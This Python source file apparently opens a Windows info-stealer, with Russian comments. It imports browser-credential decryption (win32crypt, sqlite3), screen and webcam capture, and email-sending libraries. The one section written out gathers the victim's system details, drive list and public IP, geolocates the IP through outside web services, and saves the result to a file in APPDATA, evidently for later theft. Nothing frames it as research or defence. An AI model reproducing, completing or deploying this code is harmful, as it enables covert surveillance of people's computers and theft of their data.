import os
from Crypto.Hash import SHA512
import sqlite3
import win32crypt
import email, ssl
import shutil
import requests
import zipfile
import getpass
import ip2geotools
import win32api
import platform
import tempfile
import smtplib
import time
import cv2
import sys
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart 
from email.mime.base import MIMEBase 
from email.message import Message
from email.mime.multipart import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders
from Tools.demo.mcast import sender
from ip2geotools.databases.noncommercial import DbIpCity
from os.path import basename
from smtplib import SMTP
from email.header import Header
from email.utils import parseaddr, formataddr
from base64 import encodebytes
import random
################################################################################
#                              ВСЕ ДАННЫЕ И ЛОКАЦИЯ                            #
################################################################################
drives = str(win32api.GetLogicalDriveStrings())
drives = str(drives.split('\000')[:-1])
response = DbIpCity.get(requests.get("https://ramziv.com/ip").text, api_key='free')
all_data = "Time: " + time.asctime() + '\n' + "Кодировка ФС: " + sys.getfilesystemencoding() + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nIP: '+requests.get("https://ramziv.com/ip").text+'\nГород: '+response.city+'\nGen_Location:' + response.to_json() + '\nДиски:' + drives
file = open(os.getenv("APPDATA") + '\\alldata.txt', "w+") 
file.write(all_data)
file.close()
